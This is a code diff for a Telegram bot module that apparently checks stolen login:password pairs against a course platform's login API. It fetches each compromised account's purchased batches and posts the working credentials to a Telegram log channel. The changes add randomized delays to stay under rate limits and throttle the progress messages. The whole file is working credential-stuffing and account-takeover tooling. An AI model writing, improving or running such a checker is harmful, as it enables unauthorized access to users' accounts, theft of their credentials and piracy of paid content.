@@ -1,13 +1,19 @@
 import asyncio
 import requests
+import random
 from Extractor import app
 from pyrogram import filters
 from asyncio import Lock
 from config import PREMIUM_LOGS
 
 # ================= CONFIG =================
-LOG_CHANNEL_ID = PREMIUM_LOGS
+LOG_CHANNEL_ID = PREMIUM_LOGS   # <-- change this
 SEM = asyncio.Semaphore(5)
+
+# ===== RATE CONTROL =====
+REQUEST_DELAY = (0.4, 0.7)        # delay per account
+LOG_DELAY = (0.8, 1.2)            # delay before log send
+PROGRESS_UPDATE_EVERY = 5         # edit progress every N checks
 
 # ================= GLOBAL STATE =================
 stats = {
@@ -31,12 +37,11 @@ def extract_api_name(api: str) -> str:
     api = api.replace("https://", "").replace("http://", "")
     return api.split(".")[0]
 
-def progress_bar(done, total, size=16):
+def progress_bar(done, total):
     if total == 0:
-        return "[░░░░░░░░░░░░░░░░] 0%"
-    filled = int(size * done / total)
+        return "💻 Progress : 0%"
     percent = int((done / total) * 100)
-    return f"[{'█' * filled}{'░' * (size - filled)}] {percent}%"
+    return f"💻 Progress : {percent}%"
 
 # ================= CORE FUNCTION =================
 async def login_and_get_courses(n, p, api, bot, progress_msg):
@@ -66,17 +71,18 @@ async def login_and_get_courses(n, p, api, bot, progress_msg):
                 None, post_request, f"https://{api}/post/userLogin", h, d
             )
             r1 = r1.json()
-        except Exception:
+        except:
             async with stats_lock:
                 stats["checked"] += 1
                 stats["invalid"] += 1
+            await asyncio.sleep(random.uniform(*REQUEST_DELAY))
             return
 
-        # 🔒 SAFETY CHECK
         if not isinstance(r1, dict):
             async with stats_lock:
                 stats["checked"] += 1
                 stats["invalid"] += 1
+            await asyncio.sleep(random.uniform(*REQUEST_DELAY))
             return
 
         data = r1.get("data")
@@ -84,6 +90,7 @@ async def login_and_get_courses(n, p, api, bot, progress_msg):
             async with stats_lock:
                 stats["checked"] += 1
                 stats["invalid"] += 1
+            await asyncio.sleep(random.uniform(*REQUEST_DELAY))
             return
 
         h["authorization"] = data["token"]
@@ -94,19 +101,20 @@ async def login_and_get_courses(n, p, api, bot, progress_msg):
                 None, get_request, f"https://{api}/get/mycourseweb?userid=", h
             )
             r2 = r2.json()
-        except Exception:
+        except:
             async with stats_lock:
                 stats["checked"] += 1
                 stats["invalid"] += 1
+            await asyncio.sleep(random.uniform(*REQUEST_DELAY))
             return
 
         if not isinstance(r2, dict) or not isinstance(r2.get("data"), list):
             async with stats_lock:
                 stats["checked"] += 1
                 stats["invalid"] += 1
+            await asyncio.sleep(random.uniform(*REQUEST_DELAY))
             return
 
-        # ================= SUCCESS =================
         batches = [
             i.get("course_name")
             for i in r2["data"]
@@ -117,29 +125,47 @@ async def login_and_get_courses(n, p, api, bot, progress_msg):
             async with stats_lock:
                 stats["checked"] += 1
                 stats["invalid"] += 1
+            await asyncio.sleep(random.uniform(*REQUEST_DELAY))
             return
 
-        success_text = f"🔥 {n}*{p}\n"
+        # ================= SUCCESS FORMAT =================
+        success_text = (
+            f"👤 Account: `{n}*{p}`\n\n"
+            f"📚 Total Batches: {len(batches)}\n\n"
+        )
         for b in batches:
-            success_text += f"📦 {b}\n"
+            success_text += f"🪪 {b}\n"
 
+        # ---- log channel (rate safe) ----
+        await asyncio.sleep(random.uniform(*LOG_DELAY))
         await bot.send_message(LOG_CHANNEL_ID, success_text)
+
         results.append(success_text)
 
         async with stats_lock:
             stats["checked"] += 1
             stats["valid"] += 1
+            checked = stats["checked"]
+            valid = stats["valid"]
+            invalid = stats["invalid"]
+            total = stats["total"]
 
-        remaining = stats["total"] - stats["checked"]
-        bar = progress_bar(stats["checked"], stats["total"])
+        remaining = total - checked
 
-        await progress_msg.edit_text(
-            f"{bar}\n\n"
-            f"🔄 Checked: {stats['checked']}\n"
-            f"✅ Valid: {stats['valid']}\n"
-            f"❌ Invalid: {stats['invalid']}\n"
-            f"⏳ Remaining: {remaining}"
-        )
+        # ---- progress update (throttled) ----
+        if checked % PROGRESS_UPDATE_EVERY == 0 or checked == total:
+            try:
+                await progress_msg.edit_text(
+                    f"{progress_bar(checked, total)}\n\n"
+                    f"⚙️ Checked : {checked}\n"
+                    f"📊 Valid   : {valid}\n"
+                    f"❌ Invalid : {invalid}\n"
+                    f"💾 Left    : {remaining}"
+                )
+            except:
+                pass
+
+        await asyncio.sleep(random.uniform(*REQUEST_DELAY))
 
 # ================= COMMAND =================
 @app.on_message(filters.command("imjadu2"))
@@ -166,10 +192,10 @@ async def pw_command_handler(bot, m):
 
     progress_msg = await m.reply_text(
         f"{progress_bar(0, stats['total'])}\n\n"
-        f"🔄 Checked: 0\n"
-        f"✅ Valid: 0\n"
-        f"❌ Invalid: 0\n"
-        f"⏳ Remaining: {stats['total']}"
+        f"⚙️ Checked : 0\n"
+        f"📊 Valid   : 0\n"
+        f"❌ Invalid : 0\n"
+        f"💾 Left    : {stats['total']}"
     )
 
     tasks = []
